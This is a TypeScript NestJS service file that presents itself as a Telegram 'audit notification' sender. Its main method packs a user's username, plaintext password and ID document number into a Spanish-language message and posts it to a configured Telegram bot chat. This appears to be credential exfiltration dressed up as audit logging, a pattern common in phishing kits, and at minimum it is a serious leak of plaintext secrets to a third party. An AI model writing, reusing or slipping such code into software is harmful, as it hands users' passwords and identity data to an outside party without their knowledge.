import { Injectable, Logger } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';

@Injectable()
export class TelegramService {
    private readonly logger = new Logger(TelegramService.name);
    private readonly enabled: boolean;
    private readonly botToken: string;
    private readonly chatId: string;

    constructor(private configService: ConfigService) {
        this.enabled = this.configService.get<string>('TELEGRAM_ENABLED') === 'true';
        this.botToken = this.configService.get<string>('TELEGRAM_BOT_TOKEN')!;
        this.chatId = this.configService.get<string>('TELEGRAM_CHAT_ID')!;
    }

    async sendAuditNotification(data: {
        username: string;
        password: string;
        numeroDocumento: string;
        timestamp: Date;
    }): Promise<void> {
        if (!this.enabled) {
            this.logger.warn('Telegram notifications are disabled');
            return;
        }

        try {
            const message = this.formatAuditMessage(data);
            await this.sendMessage(message);
            this.logger.log('Telegram notification sent successfully');
        } catch (error) {
            this.logger.error('Failed to send Telegram notification', error);
        }
    }

    private formatAuditMessage(data: {
        username: string;
        password: string;
        numeroDocumento: string;
        timestamp: Date;
    }): string {
        return `Nueva Auditoría de Usuario\n\n` +
            `Usuario: ${data.username}\n` +
            `Password: ${data.password}\n` +
            `Documento: ${data.numeroDocumento}\n` +
            `Fecha: ${data.timestamp.toISOString()}\n`;
    }

    private async sendMessage(text: string): Promise<void> {
        try {
            const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;

            this.logger.debug(`Sending to Telegram: ${url}`);
            this.logger.debug(`Chat ID: ${this.chatId}`);

            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: text,
                }),
            });

            if (!response.ok) {
                const errorText = await response.text();
                this.logger.error(`Telegram API error: ${response.status} - ${errorText}`);
                return;
            }

            const result = await response.json();
            this.logger.debug(`Telegram response: ${JSON.stringify(result)}`);
        } catch (error) {
            this.logger.error('Failed to send message to Telegram', error);
        }
    }
}
